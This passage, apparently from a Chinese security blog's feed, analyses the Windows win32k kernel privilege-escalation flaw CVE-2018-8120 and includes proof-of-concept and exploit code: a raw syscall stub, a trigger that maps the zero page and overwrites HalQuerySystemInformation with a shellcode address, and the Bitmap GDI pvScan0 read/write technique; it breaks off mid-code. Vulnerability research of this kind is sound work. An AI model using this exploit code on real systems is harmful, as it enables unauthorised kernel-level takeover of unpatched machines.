href="https://posts.specterops.io/defenders-think-in-graphs-too-part-1-572524c71e91" target="_blank" rel="external">Defenders Think in Graphs Too! Part 1</a></p></li><li><p><a href="https://github.com/jdu2600/Get-InjectedThreadEx/blob/main/Get-InjectedThreadEx.ps1" target="_blank" rel="external">升级后的Get-InjectedThreadEx</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;本文以Get-InjectedThread脚本为例，概括了检测线程注入的方法
    
    </summary>
    
      <category term="红蓝对抗" scheme="https://findream.github.io/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2018-8120 内核提权漏洞分析</title>
    <link href="https://findream.github.io/2023/02/08/CVE-2018-8120%E5%86%85%E6%A0%B8%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://findream.github.io/2023/02/08/CVE-2018-8120内核提权漏洞分析/</id>
    <published>2023-02-08T12:45:11.000Z</published>
    <updated>2023-02-09T05:16:37.686Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x1-漏洞描述"><a href="#0x1-漏洞描述" class="headerlink" title="0x1 漏洞描述"></a>0x1 漏洞描述</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CVE-2018-8120漏洞是一个位于win32k模块中的<code>SetImeInfoEx</code>函数的任意地址覆盖漏洞，漏洞产生的根本原因是没有对<code>tagWINDOWSTATION</code>结构的<code>spklList</code>成员做有效性验证，就对其进行解引用，如果<code>spklList</code>为NUll的话，继而对其进行解引用，导致漏洞触发。<br><a id="more"></a></p><h2 id="0x2-漏洞分析"><a href="#0x2-漏洞分析" class="headerlink" title="0x2 漏洞分析"></a>0x2 漏洞分析</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>SetImeInfoEx</code>的反汇编结果，可知<code>pklFirst = pwinsta-&gt;spklList;</code>，在取出tagWINDOWSTATION结构体的<code>spklList</code>的成员之后，并没有对<code>pklFirst</code>进行有效性验证，便对<code>pklFirst</code>进行解引用操作,<code>while ( pklFirst-&gt;hkl != piiex-&gt;hkl)</code>,假设<code>pklFirst</code>为NULL，便导致任意地址覆盖漏洞。<br><figure class="highlight zephir"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">int</span> __stdcall SetImeInfoEx(tagWINDOWSTATION *pwinsta, tagIMEINFOEX *piiex)</div><div class="line">&#123;</div><div class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></div><div class="line">  tagKL *pklFirst; <span class="comment">// eax</span></div><div class="line">  tagIMEINFOEX *v4; <span class="comment">// eax</span></div><div class="line">  result = pwinsta;</div><div class="line">  <span class="keyword">if</span> ( pwinsta )</div><div class="line">  &#123;</div><div class="line">    pklFirst = pwinsta-&gt;spklList;               <span class="comment">// 没有对pklFirst 的合法性进行验证</span></div><div class="line">    <span class="keyword">while</span> ( pklFirst-&gt;hkl != piiex-&gt;hkl )       <span class="comment">// 如果pklFirst为NULL的话，对pklFirst进行解引用。会导致失败</span></div><div class="line">    &#123;</div><div class="line">      pklFirst = pklFirst-&gt;pklNext;</div><div class="line">      <span class="keyword">if</span> ( pklFirst == pwinsta-&gt;spklList )</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    v4 = pklFirst-&gt;piiex;</div><div class="line">    <span class="keyword">if</span> ( !v4 )</div><div class="line">      <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    <span class="keyword">if</span> ( !v4-&gt;fLoadFlag )</div><div class="line">      qmemcpy(v4, piiex, sizeof(tagIMEINFOEX));</div><div class="line">    result = <span class="number">1</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">return</span> result;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;换言之，我们只需要进行构造一个<code>tagWINDOWSTATION</code>,使得tagWINDOWSTATION+0x14偏移的<code>spklList</code>成员为NULL，然后在对<code>spklList</code>进行解引用时。继而程序崩溃，导致任意地址覆盖漏洞。<br><figure class="highlight less"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">2</span>: kd&gt; dt win32k!tagWINDOWSTATION</div><div class="line">   +<span class="number">0</span>x000 <span class="attribute">dwSessionId      </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x004 <span class="attribute">rpwinstaNext     </span>: Ptr32 tagWINDOWSTATION</div><div class="line">   +<span class="number">0</span>x008 <span class="attribute">rpdeskList       </span>: Ptr32 tagDESKTOP</div><div class="line">   +<span class="number">0</span>x00c <span class="attribute">pTerm            </span>: Ptr32 tagTERMINAL</div><div class="line">   +<span class="number">0</span>x010 <span class="attribute">dwWSF_Flags      </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x014 <span class="attribute">spklList         </span>: Ptr32 tagKL</div><div class="line">   +<span class="number">0</span>x018 <span class="attribute">ptiClipLock      </span>: Ptr32 tagTHREADINFO</div><div class="line">   +<span class="number">0</span>x01c <span class="attribute">ptiDrawingClipboard </span>: Ptr32 tagTHREADINFO</div><div class="line">   +<span class="number">0</span>x020 <span class="attribute">spwndClipOpen    </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x024 <span class="attribute">spwndClipViewer  </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x028 <span class="attribute">spwndClipOwner   </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x02c <span class="attribute">pClipBase        </span>: Ptr32 tagCLIP</div><div class="line">   +<span class="number">0</span>x030 <span class="attribute">cNumClipFormats  </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x034 <span class="attribute">iClipSerialNumber </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x038 <span class="attribute">iClipSequenceNumber </span>: Uint4B</div><div class="line">   +<span class="number">0</span>x03c <span class="attribute">spwndClipboardListener </span>: Ptr32 tagWND</div><div class="line">   +<span class="number">0</span>x040 <span class="attribute">pGlobalAtomTable </span>: Ptr32 Void</div><div class="line">   +<span class="number">0</span>x044 <span class="attribute">luidEndSession   </span>: _LUID</div><div class="line">   +<span class="number">0</span>x04c <span class="attribute">luidUser         </span>: _LUID</div><div class="line">   +<span class="number">0</span>x054 <span class="attribute">psidUser         </span>: Ptr32 Void</div></pre></td></tr></table></figure></p><h2 id="0x3-漏洞验证"><a href="#0x3-漏洞验证" class="headerlink" title="0x3 漏洞验证"></a>0x3 漏洞验证</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对SetImeInfoEx进行交叉引用，发现是由<code>NtUserSetImeInfoEx</code>函数调用，首先，将传入的参数tagIMEINFOEX复制到piiex，然后创建一个WindowsStation，并将这两个作为参数传入SetImeInfoEx。<br><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">int __stdcall NtUserSetImeInfoEx(tagIMEINFOEX *<span class="built_in">a1</span>)</div><div class="line">&#123;</div><div class="line">  int <span class="built_in">v1</span><span class="comment">; // esi</span></div><div class="line">  tagWINDOWSTATION *v2<span class="comment">; // eax</span></div><div class="line">  tagIMEINFOEX piiex<span class="comment">; // [esp+10h] [ebp-178h] BYREF</span></div><div class="line">  CPPEH_RECORD ms_exc<span class="comment">; // [esp+170h] [ebp-18h]</span></div><div class="line">  UserEnterUserCritSec()<span class="comment">;</span></div><div class="line">  if ( (*gpsi &amp; <span class="number">4</span>) != <span class="number">0</span> )</div><div class="line">  &#123;</div><div class="line">    qmemcpy(&amp;piiex, <span class="built_in">a1</span>, sizeof(piiex))<span class="comment">;</span></div><div class="line">    ms_exc.registration.TryLevel = -<span class="number">2</span><span class="comment">;</span></div><div class="line">    v2 = _GetProcessWindowStation(<span class="number">0</span>)<span class="comment">;</span></div><div class="line">    <span class="built_in">v1</span> = SetImeInfoEx(v2, &amp;piiex)<span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">  else</div><div class="line">  &#123;</div><div class="line">    UserSetLastError(<span class="number">120</span>)<span class="comment">;</span></div><div class="line">    <span class="built_in">v1</span> = <span class="number">0</span><span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">  UserSessionSwitchLeaveCrit()<span class="comment">;</span></div><div class="line">  return <span class="built_in">v1</span><span class="comment">;</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于<code>NtUserSetImeInfoEx</code>函数并没有导出，只能通过系统调用的方式进行调用。首先将参数放到esi寄存器中，将调用号放到eax寄存机中，系统调用号可以利用PCHunter，在内核钩子–SSDT中，找到NtUserSetImeInfoEx的编号为550，也就是226，然后加上0x1000的偏移，就是0x1226.<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">BOOL __declspec(naked) CallNtUserSetImeInfoEx(PVOID arg0)</div><div class="line">&#123;</div><div class="line">    __asm</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">esi</span>, arg0</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">eax</span>, <span class="number">0x1226</span>           // NtUserSetImeInfoEx的调用号</div><div class="line">        <span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0x7FFE0300</span></div><div class="line">        <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span>[<span class="built_in">edx</span>]</div><div class="line">        <span class="keyword">ret</span> <span class="number">4</span></div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据<code>NtUserSetImeInfoEx</code>函数和<code>SetImeInfoEx</code>的伪代码，函数验证需要两个基本条件，第一，根据传入<code>SetImeInfoEx</code>参数为<code>tagWINDOWSTATION</code>，需要使用<code>CreateWindowStation</code>函数创建一个WindowStation结构。第二，根据<code>v2 = _GetProcessWindowStation(0);</code>可以知道，需要将创建的WindowStation设置为当前进程的。<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> POC_CVE_2018_8120()</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> bRet = <span class="literal">TRUE</span>;</div><div class="line">HWINSTA hSta = <span class="literal">NULL</span>;</div><div class="line"><span class="comment">// 创建tagWINDOWSTATION结构体</span></div><div class="line">hSta = CreateWindowStation(<span class="literal">NULL</span>, <span class="number">0</span>, READ_CONTROL, <span class="literal">NULL</span>);</div><div class="line"><span class="keyword">if</span> (hSta == <span class="literal">NULL</span>)</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"CreateWindowStation"</span>, GetLastError());</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="comment">// 将创建的结构体设置到本进程中</span></div><div class="line"><span class="keyword">if</span> (!SetProcessWindowStation(hSta))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"SetProcessWindowStation"</span>, GetLastError());</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="keyword">char</span> szBuf[<span class="number">0x15C</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line">CallNtUserSetImeInfoEx((PVOID)szBuf);</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h2 id="0x4-漏洞利用"><a href="#0x4-漏洞利用" class="headerlink" title="0x4 漏洞利用"></a>0x4 漏洞利用</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据任意地址覆盖漏洞常规的利用方法，将ShellCode地址复制到HalQuerySystemInformation地址上，然后调用<code>NtQueryIntervalProfile</code>执行即可。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们开辟零页内存和获取HalQuerySystemInformation地址，开辟零页内存是为了后续能够有空间存放HalQuerySystemInformation地址和Shellcode，不至于在触发漏洞的时候崩溃。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 0地址分配内存</span></div><div class="line"><span class="keyword">if</span> (!AllocateZeroMemory())</div><div class="line">&#123;</div><div class="line">bRet = FALSE;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] AllocateZeroMemory\n"</span>);</div><div class="line"><span class="comment">// 获取保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();</div><div class="line"><span class="keyword">if</span> (!pHalQuerySystemInformation)</div><div class="line">&#123;</div><div class="line">bRet = FALSE;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="built_in">printf</span>(<span class="string">"[*] GetHalQuerySystemInformation\n"</span>);</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据伪代码描述，只需要v4，即pklFirst-&gt;piiex，存放的是HalQuerySystemInformation，piiex存放的是Shellcode，然后调用<code>NtUserSetImeInfoEx</code>触发任意地址读写，将Shellcode覆写到HalQuerySystemInformation地址上，最后调用NtQueryIntervalProfile执行即可。<br><figure class="highlight xl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> ( pwinsta )</div><div class="line"> &#123;</div><div class="line">   <span class="function"><span class="title">pklFirst</span> = pwinsta-&gt;</span>spklList;               <span class="comment">// 没有对pklFirst 的合法性进行验证</span></div><div class="line">   <span class="function"><span class="title">while</span> ( pklFirst-&gt;</span><span class="function"><span class="title">hkl</span> != piiex-&gt;</span>hkl )       <span class="comment">// 如果pklFirst为NULL的话，对pklFirst进行解引用。会导致失败</span></div><div class="line">   &#123;</div><div class="line">     <span class="function"><span class="title">pklFirst</span> = pklFirst-&gt;</span>pklNext;</div><div class="line">     <span class="function"><span class="title">if</span> ( pklFirst == pwinsta-&gt;</span>spklList )</div><div class="line">       return <span class="number">0</span>;</div><div class="line">   &#125;</div><div class="line">   <span class="function"><span class="title">v4</span> = pklFirst-&gt;</span>piiex;                       <span class="comment">// 存放HalQuerySystemInformation</span></div><div class="line">   <span class="keyword">if</span> ( !v4 )</div><div class="line">     return <span class="number">0</span>;</div><div class="line">   <span class="function"><span class="title">if</span> ( !v4-&gt;</span>fLoadFlag )</div><div class="line">     qmemcpy(v4, piiex, sizeof(tagIMEINFOEX)); <span class="comment">// piiex存放ShellCode地址</span></div><div class="line">   result = <span class="number">1</span>;</div><div class="line"> &#125;</div></pre></td></tr></table></figure></p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">BOOL</span> Trigger_CVE_2018_8120()</div><div class="line">&#123;</div><div class="line"><span class="built_in">BOOL</span> bRet = <span class="literal">TRUE</span>;</div><div class="line"><span class="comment">// 0地址分配内存</span></div><div class="line"><span class="keyword">if</span> (!AllocateZeroMemory())</div><div class="line">&#123;</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] AllocateZeroMemory\n"</span>);</div><div class="line"><span class="comment">// 获取保存HalQuerySystemInformation函数地址的地址</span></div><div class="line">PVOID pHalQuerySystemInformation = GetHalQuerySystemInformation();</div><div class="line"><span class="keyword">if</span> (!pHalQuerySystemInformation)</div><div class="line">&#123;</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] GetHalQuerySystemInformation\n"</span>);</div><div class="line"><span class="comment">// 指定被写入的地址</span></div><div class="line">*(PDWORD)(<span class="number">0x2C</span>) = (DWORD)pHalQuerySystemInformation;</div><div class="line"><span class="comment">// 绕过while循环的验证</span></div><div class="line">*(PDWORD)(<span class="number">0x14</span>) = (DWORD)ShellCode_CVE_2018_8120;</div><div class="line"><span class="keyword">char</span> szBuf[<span class="number">0x15C</span>] = &#123; <span class="number">0</span> &#125;;</div><div class="line"><span class="comment">// 指定要写入的内容是ShellCode的地址</span></div><div class="line">*(PDWORD)szBuf = (DWORD)ShellCode_CVE_2018_8120;</div><div class="line"><span class="comment">// 触发漏洞</span></div><div class="line"><span class="keyword">if</span> (!CallNtUserSetImeInfoEx(szBuf))</div><div class="line">&#123;</div><div class="line">printf(<span class="string">"CallNtUserSetImeInfoEx"</span>, GetLastError());</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line">printf(<span class="string">"[*] CallNtUserSetImeInfoEx\n"</span>);</div><div class="line"><span class="comment">// 调用NtQueryIntervalProfile</span></div><div class="line"><span class="keyword">if</span> (!CallNtQueryIntervalProfile())</div><div class="line">&#123;</div><div class="line">bRet = <span class="literal">FALSE</span>;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div><div class="line"><span class="keyword">return</span> bRet;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;但是，在后续的调试中，发现并不是执行memcpy的操作，导致覆写失败。</p><h2 id="0x05-Bitmap-GDI"><a href="#0x05-Bitmap-GDI" class="headerlink" title="0x05 Bitmap GDI"></a>0x05 Bitmap GDI</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BitmapGDI，通过Bitmap对象泄露可供读写的内核区域，从而将任意地址覆写漏洞转化为任意地址读写漏洞。R3通过使用<code>CreateBitmap</code>函数创建一个Bitmap对象，在Bitmap对象中有一个指针pvScan0，指向一段内存域名。pvScan0指针可以在R3通过GetBitmaps以及SetBitmaps函数进行操作。至此，通过这两个函数，可以将一个任意地址复写漏洞转化成一个任意地址读写漏洞。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>CreateBitmap</code>函数原型如下,<br><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">HRESULT CreateBitmap(<span class="name">UINT</span> uiWidth,</div><div class="line">                     UINT uiHeight,</div><div class="line">                     REFWICPixelFormatGUID pixelFormat,</div><div class="line">                     WICBitmapCreateCacheOption option,</div><div class="line">                     IWICBitmap **ppIBitmap)<span class="comment">;</span></div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;当调用<code>CreateBitmap</code>之后，会在进程PEB偏移+0x94的<code>GdiSharedHandleTable</code>数组中增加一个索引。<br><figure class="highlight lasso"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="number">3</span>: kd&gt; dt _PEB</div><div class="line">ntdll!_PEB</div><div class="line">   +<span class="number">0x000</span> InheritedAddressSpace : UChar</div><div class="line">    <span class="params">...</span></div><div class="line">   +<span class="number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 <span class="literal">Void</span></div><div class="line">   +<span class="number">0x094</span> GdiSharedHandleTable : Ptr32 <span class="literal">Void</span></div><div class="line">   +<span class="number">0x098</span> ProcessStarterHelper : Ptr32 <span class="literal">Void</span></div><div class="line">   <span class="params">...</span>.</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该索引是一个<code>_GDICELL</code>结构。<br><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">typedef struct _GDICELL&#123;</div><div class="line">    <span class="type">LPVOID</span> pKernelAddress;</div><div class="line">    <span class="type">USHORT</span> wProcessId;</div><div class="line">    <span class="type">USHORT</span> wCount;</div><div class="line">    <span class="type">USHORT</span> wUpper;</div><div class="line">    <span class="type">USHORT</span> wType;</div><div class="line">    <span class="type">LPVOID</span> pUserAddress;</div><div class="line">&#125; <span class="type">GDICELL</span>;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<code>GDICELL</code>结构的第一个成员<code>pKernelAddress</code>指向的是一个<code>SURFACE</code>对象，结构体定义如下,其中比较重要的是<code>BASEOBJECT</code>和<code>SURFOBJ</code>对象，<code>pvScan0</code>指针便位于<code>SURFOBJ</code>对象中。<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">SURFACE</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">    BASEOBJECT  BaseObject;</div><div class="line">    SURFOBJ     SurfObj;</div><div class="line">    <span class="comment">//XDCOBJ *   pdcoAA;</span></div><div class="line">    FLONG       flags;</div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PALETTE</span>  * <span class="title">const</span> <span class="title">ppal</span>;</span> <span class="comment">// Use SURFACE_vSetPalette to assign a palette</span></div><div class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">EWNDOBJ</span>  *<span class="title">pWinObj</span>;</span></div><div class="line">    <span class="keyword">union</span></div><div class="line">    &#123;</div><div class="line">        HANDLE  hSecureUMPD;  <span class="comment">// if UMPD_SURFACE set</span></div><div class="line">        HANDLE  hMirrorParent;<span class="comment">// if MIRROR_SURFACE set</span></div><div class="line">        HANDLE  hDDSurface;   <span class="comment">// if DIRECTDRAW_SURFACE set</span></div><div class="line">    &#125;;</div><div class="line">    SIZEL       sizlDim;      <span class="comment">/* For SetBitmapDimension(), do NOT use</span></div><div class="line"><span class="comment">    HDC         hdc;          // Doc in "Undocumented Windows", page 546, seems to be supported with XP.</span></div><div class="line"><span class="comment">    ULONG       cRef;</span></div><div class="line"><span class="comment">    HPALETTE    hpalHint;</span></div><div class="line"><span class="comment">    /* For device-independent bitmaps: */</span></div><div class="line">    HANDLE      hDIBSection;</div><div class="line">    HANDLE      hSecure;</div><div class="line">    DWORD       dwOffset;</div><div class="line">    <span class="comment">//UINT       unk_078;</span></div><div class="line">    <span class="comment">/* reactos specific */</span></div><div class="line">    DWORD biClrImportant;</div><div class="line">&#125; SURFACE, *PSURFACE;</div></pre></td></tr></table></figure></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;下图可以清晰的观察<code>SURFACE</code>结构的内存布局，有两个主要的结构。一个叫 <code>BASEOBJECT</code>对象，每一个 GDI 对象都有的一个头部。另一个叫<code>SURFOBJ</code>对象，保存了包括我们参数信息的实际结构。<code>BASEOBJECT</code>结构位于<code>SURFOBJ</code>之前，在寻找<code>pvScan0</code>指针过程中，我们只需要知道这个结构大小即可。在x86中，BASEOBJECT的大小是<code>0x10</code>,而在x64中，BASEOBJECT的大小是<code>0x18</code>。在图中，可以清楚的看到pvScan0指针指向PixelData区域。<br>    <img src="http://hacky.wang/blog/20230208/7c4T86WJNlPl.png?imageslim" alt="mark"></p><figure class="highlight elm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">typedef struct _BASEOBJECT &#123;</div><div class="line">    <span class="type">HANDLE</span>    hHmgr; 0x04</div><div class="line">    <span class="type">PVOID</span>     pEntry; 0x08</div><div class="line">    <span class="type">LONG</span>      cExclusiveLock; 0x0d</div><div class="line">    <span class="type">PW32THREAD</span> <span class="type">Tid</span>;0x10</div><div class="line">&#125;<span class="type">BASEOBJECT</span>, *<span class="type">POBJ</span>;</div><div class="line">typedef struct _SURFOBJ &#123;</div><div class="line">    <span class="type">DHSURF</span> dhsurf;        0x04</div><div class="line">    <span class="type">HSURF</span>  hsurf;         0x08</div><div class="line">    <span class="type">DHPDEV</span> dhpdev;        0x09</div><div class="line">    <span class="type">HDEV</span>   hdev;          0x0a</div><div class="line">    <span class="type">SIZEL</span>  sizlBitmap;    0x0e</div><div class="line">    <span class="type">ULONG</span>  cjBits;        0x12</div><div class="line">    <span class="type">PVOID</span>  pvBits;        0x16</div><div class="line">    <span class="type">PVOID</span>  pvScan0;       0x20</div><div class="line">    <span class="type">LONG</span>   lDelta;        0x24</div><div class="line">    <span class="type">ULONG</span>  iUniq;         0x28</div><div class="line">    <span class="type">ULONG</span>  iBitmapFormat; 0x2c</div><div class="line">    <span class="type">USHORT</span> iType;         0x2e</div><div class="line">    <span class="type">USHORT</span> fjBitmap;      0x30</div><div class="line">&#125; <span class="type">SURFOBJ</span></div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;接着如何使用BitmapGDI技术将一个任意地址覆写漏洞，改造成一个任意地址读写漏洞。首先，我们的目标是获取pvScan0指针，根据上面的接收pvScan0位于<code>SURFACE</code>对象中的<code>SURFOBJ</code>对象第0x20偏移处。而<code>SURFACE</code>对象需要根据<code>GDICELL</code>结构的第一个成员<code>pKernelAddress</code>确定的。而<code>GDICELL</code>是GdiSharedHandleTable表中的其中一个索引。所以确定pvScan0指针需要分三步。<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">PVOID</span> GetPvScan(HBITMAP 